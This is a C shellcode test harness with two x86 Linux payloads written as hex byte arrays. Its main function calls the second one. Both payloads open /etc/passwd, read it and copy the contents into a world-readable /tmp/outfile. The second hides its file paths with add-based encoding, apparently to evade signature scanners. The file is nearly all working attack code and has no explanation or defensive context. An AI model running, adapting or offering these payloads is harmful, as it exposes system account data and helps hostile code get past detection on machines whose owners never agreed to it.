#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80"

;

unsigned char code2[] = \
"\x31\xc0\xb0\x05\x31\xc9\x51\xbe\x62\x62\x66\x53\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xbe\x52\x1e\x60\x50\x81\xc6\x11\x11\x10\x11\x89\x74\x24\xf8\xbe\x0d\x0d\x43\x52\x81\xc6\x22\x22\x22\x22\x89\x74\x24\xf4\x83\xec\x0c\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\xbe\x56\x59\x5c\x55\x81\xc6\x10\x10\x10\x10\x89\x74\x24\xfc\xbe\x1e\x5e\x64\x63\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xf8\xbe\x1e\x63\x5c\x40\x81\xc6\x11\x11\x11\x30\x89\x74\x24\xf4\x83\xec\x0c\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80"

;

int main()
{
printf("Shellcode Length:  %d\n", strlen(code));
printf("Shellcode2 Length:  %d\n", strlen(code2));
int (*ret)() = (int(*)())code2;
ret();
}